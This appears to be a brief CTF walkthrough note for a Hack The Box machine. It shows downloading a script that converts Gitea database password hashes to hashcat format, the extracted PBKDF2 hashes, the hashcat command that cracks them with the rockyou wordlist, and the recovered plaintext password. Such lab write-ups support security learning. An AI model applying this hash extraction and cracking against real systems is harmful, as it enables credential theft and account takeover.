# just hash

```
python3 gitea2hashcat.py /home/kali/gitea.db > hashes.txt
```

``wget https://gist.githubusercontent.com/h4rithd/0c5da36a0274904cafb84871cf14e271/raw/f109d178edbe756f15060244d735181278c9b57e/gitea2hashcat.py``

---

### ``cat hashes.txt``

```
sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
sha256:50000:Es/JE20QUDJIL33w/jbEiQ==:XljpYwTwRmlPyxK7uNhJXHy5cViBgtrZAFJ3EZct+tUWjDRIVLaK8QVisiOvRhhOf6M=
```

now crack it using ``hashcat``

```
hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt 
```
now ``show``

```
hashcat -m 10900 hashes.txt --show
```

``found``

```
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

![image](https://github.com/user-attachments/assets/189472a7-0fbf-48ba-b5ef-b5f55e98255c)

password is **``25282528``**

----
----

check this writeup

https://xhuntr3ss.gitbook.io/xhuntr3sss-hack-vault/usd-vault/vaultusd-walkthroughs/htb-titanic#exploit

